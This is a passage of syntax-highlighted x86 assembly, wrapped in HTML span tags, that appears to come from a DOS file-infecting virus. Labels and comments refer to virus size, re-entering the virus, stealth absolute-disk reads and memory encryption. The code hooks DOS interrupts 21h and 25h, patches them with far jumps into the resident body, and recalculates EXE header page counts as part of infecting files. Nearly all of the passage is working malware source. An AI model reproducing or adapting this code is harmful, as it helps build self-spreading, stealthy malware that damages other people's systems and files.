        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;virus_size</span><span class="sc0">
        </span><span class="sc5">segcs</span><span class="sc0">   </span><span class="sc6">rep</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc1">;        $BEEP$</span><span class="sc0">
</span><span class="sc5">no_stay</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">trace_cpm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1919h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0"> </span><span class="sc1">;fake</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">;for enable trace flag</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0Ch</span><span class="sc0">        </span><span class="sc1">;        ;PUSH 0   1   b</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;push 0  ;PUSH C0h  b0  10</span><span class="sc0">
</span><span class="sc1">;pblabel ent24</span><span class="sc0">
</span><span class="sc1">;    mov     al, 3</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">           </span><span class="sc1">;execute CP/M command</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">tmp1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._after_goto</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">p1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">user_proc</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">call_real_25</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">offset25</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._five_bytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc5">SEGCS</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc5">SEGCS</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc5">SEGCS</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._abs_read_drive</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09Ah</span><span class="sc0">          </span><span class="sc1">;call [RealInt25h]</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">offset25</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">offset25</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opJMPFAR</span><span class="sc0">       </span><span class="sc1">;jmp far</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">memory_virentry</span><span class="sc0"> </span><span class="sc1">;stealth_abs_read</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">memory_virentry</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_sux</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_sux</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._hook</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_sux</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc1">;"25"</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_real_25</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NC</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._after_goto</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">st25</span><span class="sc0"> </span><span class="sc1">;-bfr_base</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">user_proc</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;Äencrypt memoryÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc1">;sssuxx db ?</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_hook</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ret_hook.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc1">;    mov     cs:[sssuxx], ah</span><span class="sc0">
</span><span class="sc1">;    cmp ah, 4Fh</span><span class="sc0">
</span><span class="sc1">;    DOIF E</span><span class="sc0">
</span><span class="sc1">;    int 2bh</span><span class="sc0">
</span><span class="sc1">;    DONE</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">   </span><span class="sc1">;reENTER virus, need for DRDOS</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
</span><span class="sc5">continue21_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">continue21</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._after_goto</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">selector21</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">retu</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">opCMP_ALimm</span><span class="sc0"> </span><span class="sc1">;retu_off-retu-1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">user_proc</span><span class="sc0"> </span><span class="sc1">;selector; write new after_goto</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_cf</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">r2</span><span class="sc4">-</span><span class="sc5">r1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">user_proc</span><span class="sc0"> </span><span class="sc1">;before DOS of double selector</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">retu</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">continue21_1</span><span class="sc0">
</span><span class="sc1">;    jmp     continue21</span><span class="sc0">
</span><span class="sc1">;Äencrypt memoryÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;pblabel retu_off</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">   </span><span class="sc1">;DOS</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">opSEGCS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">vir_heap._after_goto</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">after_dos_goto</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">UNINIT</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">72h</span><span class="sc0"> </span><span class="sc1">;jc</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dos_cf</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc5">r2</span><span class="sc4">-</span><span class="sc5">r1</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">user_proc</span><span class="sc0"> </span><span class="sc1">;after DOS</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">r2</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0"> </span><span class="sc1">;!!!!!!!!!</span><span class="sc0">
</span><span class="sc1">;Äencrypt memoryÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">DosTruncate</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">doswrite_from_heap</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;from heap</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">doswrite</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">DosWrite_shbuf_22</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">DosWrite_shbuf</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._ziphdr</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">DosWrite</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">DosCall_exc</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">read_buf_22</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">read_buf_cx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._shift_buffer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosread</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">DosCall_exc</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc5">$ret</span><span class="sc0">    </span><span class="sc1">;®¡à ¡®âª  ®è¨¡®ª   (?)</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
</span><span class="sc1">;    cmp    [close_on_error], 3eh ;3e-no close</span><span class="sc0">
</span><span class="sc1">;    DOIF NE</span><span class="sc0">
</span><span class="sc1">;        call dosclose</span><span class="sc0">
</span><span class="sc1">;    DONE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rt_err</span><span class="sc0">  </span><span class="sc1">; ¢®ááâ ­®¢¨âì SP ¨ ¢¥à­ãâìáï ¢ userproc</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosclose</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
</span><span class="sc1">;    mov    [close_on_error], ah</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DosCall_exc</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dostell</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosseek_cur_cx_0</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dosseek_cur</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosseek_cur_neg_dx</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">dosseek_cur_cx_0</span><span class="sc0"> </span><span class="sc1">; if dx &gt; 0</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosseek_cur_cx_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosseek_cur</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DosSeek_all</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosseek_bof</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosseek_cx_0</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">dosseek</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">DosSeek_all</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">continue21</span><span class="sc0">
</span><span class="sc10">$</span><span class="sc5">$ret</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0"> </span><span class="sc1">;seek_end</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DosSeek_all</span><span class="sc0"> </span><span class="sc1">;dx:ax - filesize</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">calc_hdr_pages</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">         </span><span class="sc1">;  dx:ax - new size</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exehdr.exe_len_mod_512</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">;ostatok</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;dec dx ?</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exehdr.exe_pages</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">
